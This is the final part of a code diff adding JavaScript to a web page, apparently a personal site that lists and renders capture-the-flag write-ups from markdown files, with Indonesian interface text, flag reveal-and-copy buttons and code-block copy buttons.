+                    const titleEl = document.createElement('h3');
+                    titleEl.className = 'ctf-event-group-title';
+                    titleEl.textContent = eventName;
+                    groupEl.appendChild(titleEl);
+                    
+                    const itemsContainer = document.createElement('div');
+                    itemsContainer.className = 'ctf-event-items';
+                    
+                    groups[eventName].forEach(item => {
+                        const categoryClass = item.category ? item.category.toLowerCase() : 'misc';
+                        const diffClass = item.difficulty ? item.difficulty.toLowerCase() : 'easy';
+                        
+                        const itemEl = document.createElement('button');
+                        itemEl.className = 'ctf-item';
+                        itemEl.setAttribute('data-id', item.id);
+                        itemEl.innerHTML = `
+                            <div class="ctf-item-header">
+                                <span class="ctf-item-category ${categoryClass}">${item.category}</span>
+                                <span class="ctf-item-difficulty ${diffClass}">${item.difficulty}</span>
+                            </div>
+                            <h3 class="ctf-item-title">${item.title}</h3>
+                            <div class="ctf-item-event" style="justify-content: flex-end;">
+                                <span>${item.points} Poin</span>
+                            </div>
+                        `;
+                        
+                        itemEl.addEventListener('click', () => loadWriteup(item.id));
+                        itemsContainer.appendChild(itemEl);
+                    });
+                    
+                    groupEl.appendChild(itemsContainer);
+                    listContainer.appendChild(groupEl);
+                });
+            }
+
+            // Fetch and render Markdown writeup
+            function loadWriteup(id) {
+                // Update active list item styling
+                document.querySelectorAll('.ctf-item').forEach(el => {
+                    if (el.getAttribute('data-id') === id) {
+                        el.classList.add('active');
+                    } else {
+                        el.classList.remove('active');
+                    }
+                });
+
+                const item = writeupsData.find(w => w.id === id);
+                if (!item) return;
+
+                // Set Terminal Header Title
+                terminalTitle.innerHTML = `cat CTF/${item.file}`;
+
+                // Lock height of the container to prevent visual jump/flickering
+                const viewerCard = document.querySelector('.ctf-viewer-card');
+                if (viewerCard) {
+                    const currentHeight = viewerCard.offsetHeight;
+                    viewerCard.style.minHeight = `${currentHeight}px`;
+
+                    // Smoothly scroll to the top of the viewer card
+                    if (typeof lenis !== 'undefined' && lenis) {
+                        lenis.scrollTo(viewerCard, { offset: -100 });
+                    } else {
+                        viewerCard.scrollIntoView({ behavior: 'smooth' });
+                    }
+                }
+
+                // Show Loading State
+                viewerBody.className = "ctf-loading-state";
+                viewerBody.innerHTML = `
+                    <div class="ctf-loading-spinner">
+                        <svg viewBox="0 0 24 24" width="48" height="48" fill="none" stroke="currentColor" stroke-width="2"
+                            stroke-linecap="round" stroke-linejoin="round">
+                            <line x1="12" y1="2" x2="12" y2="6"></line>
+                            <line x1="12" y1="18" x2="12" y2="22"></line>
+                            <line x1="4.93" y1="4.93" x2="7.76" y2="7.76"></line>
+                            <line x1="16.24" y1="16.24" x2="19.07" y2="19.07"></line>
+                            <line x1="2" y1="12" x2="6" y2="12"></line>
+                            <line x1="18" y1="12" x2="22" y2="12"></line>
+                            <line x1="6.83" y1="17.17" x2="8.95" y2="15.05"></line>
+                            <line x1="15.05" y1="8.95" x2="17.17" y2="6.83"></line>
+                        </svg>
+                    </div>
+                    <h3>Membuka ${item.title}...</h3>
+                    <p>Membaca magic bytes dan mendekompresi payload write-up.</p>
+                `;
+
+                // Fetch markdown file
+                fetch(`CTF/${item.file}`)
+                    .then(response => {
+                        if (!response.ok) throw new Error("Gagal mengambil file markdown");
+                        return response.text();
+                    })
+                    .then(markdown => {
+                        renderWriteup(item, markdown);
+                        if (viewerCard) viewerCard.style.minHeight = '';
+                    })
+                    .catch(err => {
+                        console.warn("Gagal memuat markdown via fetch, mencoba fallback offline...", err);
+                        const fallbackMarkdown = markdownFallbacks[id];
+                        if (fallbackMarkdown) {
+                            renderWriteup(item, fallbackMarkdown);
+                        } else {
+                            showRenderError();
+                        }
+                        if (viewerCard) viewerCard.style.minHeight = '';
+                    });
+            }
+
+            // Show error inside content box
+            function showRenderError() {
+                viewerBody.className = "ctf-empty-state";
+                viewerBody.innerHTML = `
+                    <div class="ctf-empty-icon" style="color: var(--cyber-red)">
+                        <svg viewBox="0 0 24 24" width="64" height="64" fill="none" stroke="currentColor" stroke-width="1.5"
+                            stroke-linecap="round" stroke-linejoin="round">
+                            <polygon points="7.86 2 16.14 2 22 7.86 22 16.14 16.14 22 7.86 22 2 16.14 2 7.86 7.86 2"></polygon>
+                            <line x1="12" y1="8" x2="12" y2="12"></line>
+                            <line x1="12" y1="16" x2="12.01" y2="16"></line>
+                        </svg>
+                    </div>
+                    <h3>Gagal Memuat File</h3>
+                    <p>Tidak dapat mengambil data write-up dari server. Pastikan file tersebut ada di direktori CTF/ Anda.</p>
+                `;
+            }
+
+            // Render writeup structure in DOM
+            function renderWriteup(meta, markdown) {
+                viewerBody.className = "ctf-writeup-view";
+                
+                // Parse markdown to HTML using marked
+                const htmlContent = marked.parse(markdown);
+                
+                const difficultyClass = meta.difficulty ? meta.difficulty.toLowerCase() : 'easy';
+                const categoryClass = meta.category ? meta.category.toLowerCase() : 'misc';
+                
+                // Flag card component if flag exists
+                let flagHtml = '';
+                if (meta.flag) {
+                    flagHtml = `
+                        <div class="writeup-flag-card">
+                            <div class="flag-label-group">
+                                <span class="flag-icon">
+                                    <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5"
+                                        stroke-linecap="round" stroke-linejoin="round">
+                                        <path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"></path>
+                                        <line x1="4" y1="22" x2="4" y2="15"></line>
+                                    </svg>
+                                </span>
+                                <span class="flag-label">FLAG TERDETEKSI</span>
+                            </div>
+                            <div class="flag-value-wrapper">
+                                <div class="flag-value-container">
+                                    <span class="flag-blur">PLAYIT{${'•'.repeat(meta.flag.length - 8)}}</span>
+                                </div>
+                                <button class="flag-copy-btn" onclick="revealAndCopyFlag(this, '${meta.flag}')">Reveal & Copy</button>
+                            </div>
+                        </div>
+                    `;
+                }
+
+                viewerBody.innerHTML = `
+                    <div class="writeup-header-meta">
+                        <div>
+                            <h2 class="writeup-header-title">${meta.title}</h2>
+                            <div class="writeup-meta-items">
+                                <span class="writeup-meta-badge">
+                                    <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                                        <circle cx="12" cy="12" r="10"></circle>
+                                        <polyline points="12 6 12 12 16 14"></polyline>
+                                    </svg>
+                                    ${meta.date}
+                                </span>
+                                <span class="writeup-meta-badge">
+                                    <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                                        <polygon points="12 2 2 7 12 12 22 7 12 2"></polygon>
+                                        <polyline points="2 17 12 22 22 17"></polyline>
+                                    </svg>
+                                    ${meta.event}
+                                </span>
+                                <span class="writeup-meta-badge">
+                                    <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                                        <path d="M6 9H4.5a2.5 2.5 0 0 1 0-5H6"></path>
+                                        <path d="M18 9h1.5a2.5 2.5 0 0 0 0-5H18"></path>
+                                        <path d="M4 22h16"></path>
+                                        <path d="M10 14.66V17c0 .55-.45 1-1 1H4v2h16v-2h-5c-.55 0-1-.45-1-1v-2.34"></path>
+                                        <path d="M12 2a4 4 0 0 0-4 4v8a4 4 0 0 0 8 0V6a4 4 0 0 0-4-4z"></path>
+                                    </svg>
+                                    ${meta.points} Poin
+                                </span>
+                            </div>
+                        </div>
+                        ${flagHtml}
+                    </div>
+                    <article class="ctf-rendered-content">
+                        ${htmlContent}
+                    </article>
+                `;
+
+                // Add copy buttons to pre blocks
+                document.querySelectorAll('.ctf-rendered-content pre').forEach(pre => {
+                    const copyBtn = document.createElement('button');
+                    copyBtn.className = 'code-block-copy-btn';
+                    copyBtn.textContent = 'Copy';
+                    pre.appendChild(copyBtn);
+
+                    copyBtn.addEventListener('click', () => {
+                        const code = pre.querySelector('code');
+                        if (code) {
+                            navigator.clipboard.writeText(code.textContent)
+                                .then(() => {
+                                    copyBtn.textContent = 'Copied!';
+                                    copyBtn.style.color = 'var(--cyber-accent)';
+                                    copyBtn.style.borderColor = 'var(--cyber-accent)';
+                                    setTimeout(() => {
+                                        copyBtn.textContent = 'Copy';
+                                        copyBtn.style.color = '';
+                                        copyBtn.style.borderColor = '';
+                                    }, 2000);
+                                })
+                                .catch(err => {
+                                    console.error('Gagal menyalin kode:', err);
+                                    copyBtn.textContent = 'Failed';
+                                });
+                        }
+                    });
+                });
+
+                // Scroll to top of content
+                viewerBody.scrollTop = 0;
+            }
+        })();
+
+        // Global flag reveal function
+        function revealAndCopyFlag(btnEl, flag) {
+            const cardEl = btnEl.closest('.writeup-flag-card');
+            const valueSpan = cardEl.querySelector('.flag-value-container span');
+            
+            if (cardEl.classList.contains('flag-revealed')) {
+                // If already revealed, copy it again
+                copyTextToClipboard(flag, btnEl, cardEl);
+                return;
+            }
+
+            cardEl.classList.add('flag-revealed');
+            valueSpan.textContent = flag;
+            valueSpan.classList.remove('flag-blur');
+
+            copyTextToClipboard(flag, btnEl, cardEl);
+        }
+
+        // Helper to copy and animate
+        function copyTextToClipboard(text, btnEl, cardEl) {
+            navigator.clipboard.writeText(text)
+                .then(() => {
+                    btnEl.textContent = "COPIED!";
+                    btnEl.style.background = 'var(--cyber-accent)';
+                    btnEl.style.color = 'var(--cyber-bg)';
+                    btnEl.style.boxShadow = '0 0 15px var(--cyber-accent)';
+                    
+                    // Add subtle card glow
+                    cardEl.style.boxShadow = '0 0 30px var(--cyber-accent-glow)';
+                    
+                    setTimeout(() => {
+                        btnEl.textContent = "RE-COPY";
+                        btnEl.style.background = '';
+                        btnEl.style.color = '';
+                        btnEl.style.boxShadow = '';
+                        cardEl.style.boxShadow = '';
+                    }, 2000);
+                })
+                .catch(err => {
+                    console.error("Gagal menyalin flag:", err);
+                });
+        }
+    </script>
+
+</html>
